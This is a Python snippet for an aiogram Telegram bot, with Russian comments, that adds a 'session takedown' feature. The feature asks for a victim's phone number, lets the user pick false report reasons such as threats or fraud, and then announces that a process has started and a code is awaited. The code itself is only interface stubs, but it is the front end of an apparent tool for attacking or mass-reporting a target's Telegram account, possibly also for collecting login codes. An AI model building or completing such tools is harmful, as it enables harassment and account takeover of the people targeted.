# Добавь эти импорты в начало index.py
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# Опишем состояния
class MyStates(StatesGroup):
    waiting_phone = State()

# Кнопка СНОС СЕССИЙ
@dp.callback_query(F.data == "snos")
async def start_snos(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("☎️ Введите номер телефона жертвы (начиная с +):")
    await state.set_state(MyStates.waiting_phone)

# Принимаем номер и выдаем ПРИЧИНЫ
@dp.message(MyStates.waiting_phone)
async def get_phone_and_show_reasons(message: types.Message, state: FSMContext):
    kb = InlineKeyboardBuilder()
    for r in ["⚠️ Угрозы", "💸 Обман", "🛡️ Мошенничество"]:
        kb.button(text=r, callback_data="final_step")
    kb.button(text="📥 ЖДУ КОД", callback_data="final_step")
    kb.adjust(1)
    
    await message.answer(f"🎯 Номер `{message.text}` принят.\nВыберите причину:", 
                         reply_markup=kb.as_markup(), parse_mode="Markdown")
    await state.clear()

@dp.callback_query(F.data == "final_step")
async def final(call: types.CallbackQuery):
    await call.message.answer("🚀 **Процесс запущен.**\nИспользуется IP инициатора.\n\nОжидаю код...")
